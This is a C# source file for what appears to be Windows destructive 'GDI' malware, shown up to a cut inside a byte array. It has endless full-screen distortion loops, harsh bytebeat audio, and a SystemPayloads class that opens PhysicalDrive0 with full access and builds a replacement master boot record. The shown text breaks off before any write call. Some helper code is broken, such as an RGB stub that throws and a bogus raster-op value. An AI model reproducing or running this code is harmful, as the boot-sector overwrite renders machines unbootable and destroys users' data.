using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace GDISharp
{
    public static class Stuff
    {
        public enum Rops
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            SRCERASE = 0x00440328,
            NOTSRCINVERT = 0x999999,
            MERGECOPY = 0x00C000CA,
            PATCOPY = 0x00F00021,
            PATINVERT = 0x005A0049,
            SRCRNBW = 0x00E20746,
        };

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct BLENDFUNCTION
        {
            public byte BlendOp;
            public byte BlendFlags;
            public byte SourceConstantAlpha;
            public byte AlphaFormat;
            public BLENDFUNCTION(byte alpha)
            {
                BlendOp = 0;
                BlendFlags = 0;
                SourceConstantAlpha = alpha;
                AlphaFormat = 0;
            }
        }

        public enum AlphaFormats
        {
            AC_SRC_OVER = 0x00,
            AC_SRC_ALPHA = 0x01
        };

        public static uint Hue(int nHue)
        {
            float X = 1 - (float)System.Math.Abs(System.Math.IEEERemainder(nHue / 60.0, 2) - 1);

            float r = 0;
            float g = 0;
            float b = 0;

            if (nHue >= 0 && nHue < 60)
            {
                r = 1;
                g = X;
                b = 0;
            }

            else if (nHue >= 60 && nHue < 120)
            {
                r = X;
                g = 1;
                b = 0;
            }
            else if (nHue >= 120 && nHue < 180)
            {
                r = 0;
                g = 1;
                b = X;
            }
            else if (nHue >= 180 && nHue < 240)
            {
                r = 0;
                g = X;
                b = 1;
            }
            else if (nHue >= 240 && nHue < 300)
            {
                r = X;
                g = 0;
                b = 1;
            }
            else if (nHue >= 300 && nHue < 360)
            {
                r = 1;
                g = 0;
                b = X;
            }

            uint result = RGB(r * 255, g * 255, b * 255);
            return result;
        }

        private static uint RGB(float v1, float v2, float v3)
        {
            throw new NotImplementedException();
        }

        public static float HueToRGB(float v1, float v2, float vH)
        {
            if (vH < 0) vH += 1;
            if (vH > 1) vH -= 1;
            if ((6 * vH) < 1) return (v1 + (v2 - v1) * 6 * vH);
            if ((2 * vH) < 1) return v2;
            if ((3 * vH) < 2) return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);
            return v1;
        }
    }

    public class GDIEffects
    {
        private const double M_PI = 3.14159265358979323846264338327950288;

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int X; public int Y; }

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateSolidBrush(uint crColor);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("gdi32.dll")]
        private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

        [DllImport("msimg32.dll")]
        private static extern bool AlphaBlend
        (
            IntPtr hdcDest,
            int nXOriginDest,
            int nYOriginDest,
            int nWidthDest,
            int nHeightDest,
            IntPtr hdcSrc,
            int nXOriginSrc,
            int nYOriginSrc,
            int nWidthSrc,
            int nHeightSrc,
            Stuff.BLENDFUNCTION blendFunction
        );

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);

        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern bool PlgBlt
        (
            IntPtr hdcDest,
            POINT[] lpPoint,
            IntPtr hdcSrc,
            int nXSrc, int nYSrc,
            int nWidth, int nHeight,
            IntPtr hbmMask,
            int xMask, int yMask
        );

        public static void Bright()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(hdc);

            float radius = 0.0f;
            double angle = 0;

            while (true)
            {
                hdc = GetDC(IntPtr.Zero);

                int x = (int)(Math.Cos(angle) * radius);
                int y = (int)(Math.Sin(angle) * radius);

                StretchBlt(hdc, x, y, w - x * 2, h - y * 2, hdc, 0, 0, w, h, (uint)Stuff.Rops.SRCPAINT);
                radius += 0.1f;

                Thread.Sleep(1);

                ReleaseDC(IntPtr.Zero, hdc);

                angle = (M_PI + (angle + M_PI / radius) % (M_PI * radius)) / 1.001;
            }
        }

        public static void Blur1()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            Random r = new Random();
            POINT[] lppoint = new POINT[3];

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                IntPtr holdbit = SelectObject(mhdc, hbit);

                if (r.Next(2) == 1)
                {
                    lppoint[0] = new POINT { X = 0 + 5, Y = 0 - 5 };
                    lppoint[1] = new POINT { X = w + 5, Y = 0 + 5 };
                    lppoint[2] = new POINT { X = 0 - 5, Y = h - 5 };
                }

                else
                {
                    lppoint[0] = new POINT { X = 0 - 5, Y = 0 + 5 };
                    lppoint[1] = new POINT { X = w - 5, Y = 0 - 5 };
                    lppoint[2] = new POINT { X = 0 + 5, Y = h + 5 };
                }

                PlgBlt(mhdc, lppoint, hdc, 0, 0, w, h, IntPtr.Zero, 0, 0);
                AlphaBlend(hdc, 0, 0, w, h, mhdc, 0, 0, w, h, new Stuff.BLENDFUNCTION(60));

                SelectObject(mhdc, holdbit);
                DeleteObject(hbit);
                DeleteDC(mhdc);
                ReleaseDC(IntPtr.Zero, hdc);

                Thread.Sleep(1);
            }
        }

        public static void Texts()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            Random random = new Random();

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mhdc = CreateCompatibleDC(hdc);
                IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mhdc, hbit);
                BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, (uint)Stuff.Rops.SRCCOPY);
                Graphics graphics = Graphics.FromHdc(mhdc);
                graphics.RotateTransform(360);
                
                Brush brush = new SolidBrush
                (
                    Color.FromArgb
                    (
                        random.Next(255),
                        random.Next(255),
                        random.Next(255)
                    )
                );

                graphics.DrawString
                (
                    "[DATA EXPUNGED]",
                    new Font("Tahoma", random.Next(1, 102)),
                    brush,
                    random.Next(w),
                    random.Next(h)
                );

                BitBlt(hdc, 0, 0, w, h, mhdc, 0, 0, (uint)Stuff.Rops.SRCCOPY);
                Thread.Sleep(1);
                DeleteObject(hbit);
                DeleteObject(mhdc);
            }
        }

        public static void Pats()
        {
            Random r = new Random();

            int x = GetSystemMetrics(0);
            int y = GetSystemMetrics(1);

            uint[] rndclr = { 0x0000FF, 0xBC00FF, 0x33FF00, 0x00F7FF, 0xEF0000 };

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);

                uint color = rndclr[r.Next(rndclr.Length)];
                IntPtr brush = CreateSolidBrush(color);

                IntPtr oldBrush = SelectObject(hdc, brush);

                PatBlt(hdc, 0, 0, x, y, (uint)Stuff.Rops.PATINVERT);

                SelectObject(hdc, oldBrush);
                DeleteObject(brush);
                ReleaseDC(IntPtr.Zero, hdc);

                Thread.Sleep(1000);
            }
        }

        public static void Masher()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            Random random = new Random();

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);

                BitBlt
                (
                    hdc,
                    random.Next(12), random.Next(12),
                    random.Next(w), random.Next(h),
                    hdc,
                    random.Next(12), random.Next(12),
                    (uint)Stuff.Rops.SRCAND
                );

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }

        public static void BarakoEffect()
        {
            Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
            Random random = new Random();

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            while (true)
            {
                Pen barako = new Pen
                (
                    Color.FromArgb
                    (
                        random.Next(255),
                        random.Next(255),
                        random.Next(255),
                        random.Next(255)
                    ),
                    
                    random.Next(70)
                );

                barako.LineJoin = System.Drawing.Drawing2D.LineJoin.Round;
                barako.StartCap = barako.EndCap = System.Drawing.Drawing2D.LineCap.Square;

                Point[] point =
                {
                    new Point
                    (
                        random.Next(-w, w + w),
                        random.Next(-h, h + h)
                    ),

                    new Point
                    (
                        random.Next(-w, w + w),
                        random.Next(-h, h + h)
                    )
                };

                graphics.DrawLines(barako, point);
            }
        }

        public static void BitBlts()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);

            Random random = new Random();

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);

                BitBlt
                (
                    hdc,
                    3, 3,
                    w, h,
                    hdc,
                    0, 0,
                    (uint)Stuff.Rops.SRCINVERT
                );

                Thread.Sleep(10);

                BitBlt
                (
                    hdc,
                    3, 3,
                    w, h,
                    hdc,
                    0, 0,
                    (uint)Stuff.Rops.NOTSRCINVERT
                );

                Thread.Sleep(10);

                ReleaseDC(IntPtr.Zero, hdc);
            }
        }
    }

    public static class Bytebeats
    {
        public static void Bytebeat1()
        {
            int hz = 8000;
            int secs = 80;

            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 2; t < data.Length; t++)
                    data[t] = (byte)
                    (
                        128 * Math.Sin((((((t * t)) + 2) / ((t >> 10) + 2))) / 40.75) + 128
                    );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }

        public static void Bytebeat2()
        {
            int hz = 8000;
            int secs = 80;

            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 2; t < data.Length; t++)
                    data[t] = (byte)
                    (
                        (((t * t)) + 2) / ((t >> 16) + 2)
                    );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }

        public static void Bytebeat3()
        {
            int hz = 8000;
            int secs = 80;

            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 2; t < data.Length; t++)
                    data[t] = (byte)
                    (
                        128 * Math.Sin(((t * (t >> 9 | 9)) * t >> 12)) + 128
                    );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }

        public static void Bytebeat4()
        {
            int hz = 8000;
            int secs = 80;

            Random random = new Random();
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = hz;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = secs;

                var data = new byte[sample_rate * seconds];

                for (var t = 2; t < data.Length; t++)
                    data[t] = (byte)
                    (
                        (t * t >> 8) * Math.Sqrt((t & t >> 8))
                    );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
        }
    }

    public static class SystemPayloads
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateFile
        (
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );

        [DllImport("kernel32.dll")]
        private static extern bool WriteFile
        (
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
        );

        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint GENERIC_EXECUTE = 0x20000000;
        private const uint GENERIC_ALL = 0x10000000;

        private const uint FileShareRead = 0x00000001;
        private const uint FileShareWrite = 0x00000002;
        private const uint OpenExisting = 0x00000003;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        
        private const uint NazariusOS = 512;

        public static void OverWriteSectors(string[] arguments)
        {
            var kernel = 
            CreateFile
            (
                "\\\\.\\PhysicalDrive0",
                GENERIC_ALL,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                FileFlagDeleteOnClose,
                IntPtr.Zero
            );

            var MbrData = new byte[]
            {
                0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBC, 0x00, 0x7C, 0x8E, 0xD0, 0xE8, 0x1C, 0x00, 0xE8, 0x05,
                0x00, 0xEA, 0x00, 0x7E, 0x00, 0x00, 0xB4, 0x02, 0xB0, 0x05, 0xB5, 0x00, 0xB1, 0x02, 0xB6, 0x00,
                0x31, 0xDB, 0x8E, 0xC3, 0xBB, 0x00, 0x7E, 0xCD, 0x13, 0xC3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xC3,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
                0xE8, 0x15, 0x00, 0xE8, 0x00, 0x00, 0x68, 0x00, 0xA0, 0x07, 0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB,
                0x31, 0xC9, 0xBA, 0x08, 0x00, 0xDB, 0xE3, 0xC3, 0xB8, 0x40, 0x00, 0x8E, 0xE8, 0x65, 0x66, 0xA1,
                0x6C, 0x00, 0x66, 0x2B, 0x06, 0x9B, 0x80, 0x66, 0x83, 0xF8, 0x37, 0x0F, 0x82, 0x19, 0x01, 0x66,
                0x3D, 0x91, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x2F, 0x01, 0x66, 0x3D, 0xEC, 0x00, 0x00, 0x00, 0x0F,
                0x82, 0x52, 0x01, 0x66, 0x3D, 0x47, 0x01, 0x00, 0x00, 0x0F, 0x82, 0x72, 0x01, 0x66, 0x3D, 0xAE,
                0x01, 0x00, 0x00, 0x72, 0x0C, 0x65, 0x66, 0xA1, 0x6C, 0x00, 0x66, 0xA3, 0x9B, 0x80, 0xE9, 0xE7,
                0x00, 0xE8, 0x06, 0x00, 0xE8, 0x29, 0x00, 0xE8, 0x77, 0x00, 0xB0, 0xFE, 0xE6, 0x64, 0xFA, 0xF4,
                0xEB, 0xFE, 0x60, 0xB0, 0xB6, 0xE6, 0x43, 0xB8, 0x2C, 0x01, 0xC0, 0xE8, 0x06, 0xE6, 0x42, 0xE4,
                0x61, 0x0C, 0x03, 0xE6, 0x61, 0x61, 0xC3, 0x60, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0x61, 0xC3,
                0x89, 0x16, 0x08, 0x81, 0x8B, 0x16, 0x08, 0x81, 0x83, 0xC2, 0x52, 0xB0, 0x00, 0xEE, 0x8B, 0x16,
                0x08, 0x81, 0x83, 0xC2, 0x37, 0xB0, 0x10, 0xEE, 0xEC, 0xA8, 0x10, 0x75, 0xFB, 0x8B, 0x16, 0x08,
                0x81, 0x83, 0xC2, 0x30, 0x66, 0xB8, 0x0C, 0x81, 0x00, 0x00, 0x66, 0xEF, 0x8B, 0x16, 0x08, 0x81,
                0x83, 0xC2, 0x3C, 0xB8, 0x05, 0x00, 0xEF, 0x8B, 0x16, 0x08, 0x81, 0x83, 0xC2, 0x44, 0x66, 0xB8,
                0x0F, 0x00, 0x00, 0x00, 0x66, 0xEF, 0x8B, 0x16, 0x08, 0x81, 0x83, 0xC2, 0x37, 0xB0, 0x0C, 0xEE,
                0xC3, 0x66, 0x57, 0x66, 0xBF, 0x1C, 0xA7, 0x00, 0x00, 0x51, 0x66, 0x0F, 0xB7, 0xC9, 0xF3, 0xA4,
                0x59, 0x8B, 0x16, 0x08, 0x81, 0x83, 0xC2, 0x20, 0x66, 0xB8, 0x1C, 0xA7, 0x00, 0x00, 0x66, 0xEF,
                0x8B, 0x16, 0x08, 0x81, 0x83, 0xC2, 0x10, 0x66, 0x0F, 0xB7, 0xC1, 0x66, 0xEF, 0x66, 0x5F, 0xC3,
                0xBA, 0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0xE9, 0xFD, 0xFE, 0xB9, 0xFF, 0x07, 0xE2, 0xFE,
                0xB4, 0x01, 0xCD, 0x16, 0x0F, 0x84, 0xF0, 0xFE, 0xC3, 0xB4, 0x02, 0x30, 0xFF, 0xBA, 0x0F, 0x0C,
                0xCD, 0x10, 0xAC, 0x84, 0xC0, 0x74, 0x10, 0xB4, 0x0E, 0x8A, 0x1E, 0x9F, 0x80, 0x80, 0xE3, 0x0F,
                0x80, 0xC3, 0x20, 0xCD, 0x10, 0xEB, 0xEB, 0xC3, 0xE8, 0x27, 0xFF, 0xB8, 0x00, 0xA0, 0x8E, 0xC0,
                0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xE4, 0x40, 0x24, 0x1F, 0xAA, 0xE2, 0xF9, 0xBE, 0xB3, 0x80, 0xE8,
                0xC7, 0xFF, 0xFE, 0x06, 0x9F, 0x80, 0xEB, 0xA8, 0xE8, 0x1C, 0xFF, 0xB8, 0x00, 0xA0, 0x8E, 0xC0,
                0x31, 0xFF, 0x89, 0xF8, 0xBB, 0x40, 0x01, 0x31, 0xD2, 0xF7, 0xF3, 0x20, 0xD0, 0x02, 0x06, 0x9F,
                0x80, 0xAA, 0x81, 0xFF, 0x00, 0xFA, 0x75, 0xEA, 0xBE, 0xD1, 0x80, 0xE8, 0x9B, 0xFF, 0xFE, 0x06,
                0x9F, 0x80, 0xE9, 0x7B, 0xFF, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0x89, 0xF8, 0xBB, 0x40,
                0x01, 0x31, 0xD2, 0xF7, 0xF3, 0x30, 0xD0, 0x02, 0x06, 0x9F, 0x80, 0xAA, 0x81, 0xFF, 0x00, 0xFA,
                0x75, 0xEA, 0xBE, 0xEA, 0x80, 0xE8, 0x71, 0xFF, 0xFE, 0x06, 0x9F, 0x80, 0xE9, 0x51, 0xFF, 0xB8,
                0x00, 0xA0, 0xE8, 0x1F, 0x00, 0xE9, 0x48, 0xFF, 0x66, 0xC7, 0x06, 0x7A, 0x80, 0x80, 0xFD, 0xFF,
                0xFF, 0xB9, 0x40, 0x01, 0x66, 0x31, 0xC0, 0x66, 0xA3, 0x82, 0x80, 0x66, 0xA3, 0x86, 0x80, 0xC6,
                0x06, 0x9A, 0x80, 0x32, 0x66, 0xA1, 0x82, 0x80, 0x66, 0x0F, 0xAF, 0xC0, 0x66, 0xC1, 0xF8, 0x08,
                0x66, 0xA3, 0x8A, 0x80, 0x66, 0xA1, 0x86, 0x80, 0x66, 0x0F, 0xAF, 0xC0, 0x66, 0xC1, 0xF8, 0x08,
                0x66, 0xA3, 0x8E, 0x80, 0x66, 0xA1, 0x8A, 0x80, 0x66, 0x03, 0x06, 0x8E, 0x80, 0x66, 0x3D, 0x00,
                0x04, 0x00, 0x00, 0x73, 0x42, 0x66, 0xA1, 0x8A, 0x80, 0x66, 0x2B, 0x06, 0x8E, 0x80, 0x66, 0x03,
                0x06, 0x7A, 0x80, 0x66, 0xA3, 0x92, 0x80, 0x66, 0xA1, 0x82, 0x80, 0x66, 0x0F, 0xAF, 0x06, 0x86,
                0x80, 0x66, 0xD1, 0xE0, 0x66, 0xC1, 0xF8, 0x08, 0x66, 0x03, 0x06, 0x7E, 0x80, 0x66, 0xA3, 0x96,
                0x80, 0x66, 0xA1, 0x92, 0x80, 0x66, 0xA3, 0x82, 0x80, 0x66, 0xA1, 0x96, 0x80, 0x66, 0xA3, 0x86,
                0x80, 0xFE, 0x0E, 0x9A, 0x80, 0x75, 0x8D, 0x66, 0x31, 0xC0, 0xA0, 0x9A, 0x80, 0xAA, 0x66, 0x83,
                0x06, 0x7A, 0x80, 0x03, 0x49, 0x0F, 0x85, 0x6B, 0xFF, 0x66, 0x83, 0x06, 0x7E, 0x80, 0x04, 0x45,
                0x81, 0xFD, 0xC8, 0x00, 0x0F, 0x82, 0x50, 0xFF, 0xEB, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x45, 0x6C, 0x66, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72,
